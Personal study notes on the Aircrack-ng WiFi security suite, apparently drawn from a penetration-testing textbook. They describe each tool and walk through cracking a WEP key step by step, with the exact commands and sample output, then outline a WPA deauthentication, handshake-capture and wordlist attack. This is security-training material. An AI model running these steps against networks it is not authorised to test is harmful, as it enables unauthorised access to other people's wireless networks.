---
tags:
  - CyberSec/tools
  - CyberSec
---
Aircrack-ng is a complete suite of tools to assess WiFi network security.
It focuses on different areas of WiFi security:
- Monitoring: Packet capture and export of data to text files for further processing by third party tools
- Attacking: Replay attacks, deauthentication, fake access points and others via packet injection
- Testing: Checking WiFi cards and driver capabilities (capture and injection)
- Cracking: WEP and WPA PSK (WPA 1 and 2)

- `aircrack-ng` 
	- is an 802.11 WEP, 802.11i WPA/WPA2, and 802.11w WPA2 key cracking program.
	- used to crack the WPA/WP2 passphrase using the captured WPA handshake
- `airmon‐ng` 
	- used to enable monitor mode on wireless interfaces. It may also be used to go back from monitor mode to managed mode. 
	- Entering the airmon‐ng command without parameters will show the interfaces status.  
	- to start monitor mode on an interface : `airmon-ng start [interface]`
	- It can also list/kill programs that can interfere with the wireless card operation using the `airmon-ng check kill` command.
- `airodump-ng` 
	- used for packet capture, capturing raw 802.11 frames. (here it is used to capture the 4-way handshake)
	- `airodump-ng -c [channel] --bssid [bssid of device] -w [out_capture] [interface]`
- `aireplay-ng` 
	- sends deauthentication packets to either a specific client (targeted attack) or to all clients connected to an access point (broadcast attack).
- `packetforge-ng`
	- a  tool to create encrypted packets that can subsequently be used for injection. You may create various types of packets such as arp requests, UDP, ICMP and custom packets. The
       most common use is to create ARP requests for subsequent injection.
    - To create an encrypted packet, you must have a PRGA (pseudo random generation algorithm) file. This is used to encrypt the packet you create. This is typically obtained from  aireplay‐ng  chopchop
       or fragmentation attacks.
## Cracking WEP PSK
An attacker can also use the Aircrack-ng set of tools to crack (recover) the WEP PSK. To perform this attack using the Aircrack-ng suite, an attacker first launches Airmon-ng, as shown in Example 5-16.

**_Example 5-16_** _-_ _Using Airmon-ng to Monitor a Wireless Network_

```
root@kali# airmon-ng start wlan0 11 
```

In Example, 5-16 the wireless interface is **wlan0**, and the selected wireless channel is **11**. Now the attacker wants to listen to all communications directed to the BSSID **08:02:8E:D3:88:82**, as shown in Example 5-17. The command in Example 5-17 writes all the traffic to a capture file called **omar_capture.cap**. The attacker only has to specify the prefix for the capture file.

**_Example 5-17_** _-_ _Using_ **_Airodump-ng_** _to Listen to All Traffic to the BSSID_ **_08:02:8E:D3:88:82_**

```
root@kali# airodump-ng -c 11 --bssid 08:02:8E:D3:88:82 -w omar_capture wlan0
```

The attacker can use Aireplay-ng to listen for ARP requests and then replay, or inject, them back into the wireless network, as shown in Example 5-18.

**_Example 5-18_** _-_ _Using Aireplay-ng to Inject ARP Packets_

```
root@kali# aireplay-ng -3 -b 08:02:8E:D3:88:82 -h 00:0F:B5:88:AC:82 wlan0
```

The attacker can use Aircrack-ng to crack the WEP PSK, as demonstrated in Example 5-19.

**_Example 5-19_** _-_ _Using_ **_Aircrack-ng_** _to Crack the WEP PSK_

```
root@kali# aircrack-ng -b 08:02:8E:D3:88:82 omar_capture.cap
```

After Aircrack-ng cracks (recovers) the WEP PSK, the output in Example 5-20 is displayed. The cracked (recovered) WEP PSK is shown in the highlighted line.

**_Example 5-20_** _-_ _The Cracked (Recovered) WEP PSK_
```
                                              Aircrack-ng 0.9

                                 [00:02:12] Tested 924346 keys (got 99821 IVs)

 KB  depth byte(vote)
 0     0/ 9 12( 15) A9( 25) 47( 22) F7( 12) FE( 22) 1B( 5) 77( 3) A5( 5) F6( 3) 02( 20)
 1     0/ 8 22( 11) A8( 27) E0( 24) 06( 18) 3B( 26) 4E( 15) E1( 13) 25( 15) 89( 12) E2( 12)
 2     0/ 2 32( 17) A6( 23) 15( 27) 02( 15) 6B( 25) E0( 15) AB( 13) 05( 14) 17( 11) 22( 10)
 3     1/ 5 46( 13) AA( 20) 9B( 20) 4B( 17) 4A( 26) 2B( 15) 4D( 13) 55( 15) 6A( 15) 7A( 15)

                        KEY FOUND! [ 56:7A:15:9E:A8 ]

      Decrypted correctly: 100%
```

## Cracking WPA PSK
Step 1. The attacker uses Airmon-ng to start the wireless interface in monitoring mode, using the `airmon-ng start wlan0` command. Figure displays three terminal windows. The second terminal window from the top shows the output of the airodump-ng wlan0 command, displaying all adjacent wireless networks.
Step 2. After locating the corp-net network, the attacker uses the airodump-ng command, as shown in the first terminal window displayed in Figure 5-21, to capture all the traffic to a capture file called wpa_capture, specifying the wireless channel (11 , in this example), the BSSID, and the wireless interface (wlan0).
![[Aircrack-ng-1751398180489.png]]
Step 3. The attacker uses the aireplay-ng command, as shown in Figure 5-22, to perform a deauthentication attack against the wireless network. In the terminal shown at the top of Figure 5-23, you can see that the attacker has collected the WPA handshake.
![[Aircrack-ng-1751398215941.png]]
Step 4. The attacker uses the aircrack-ng command to crack the WPA PSK by using a word list, as shown in Figure 5-23. (The filename is words in this example.)
![[Aircrack-ng-1751398339082.png]]
Step 5. The tool takes a while to process, depending on the computer power and the complexity of the PSK. After it cracks the WPA PSK, a window similar to the one shown in Figure 5-24 shows the WPA PSK (corpsupersecret in this example).
![[Aircrack-ng-1751398366544.png]]

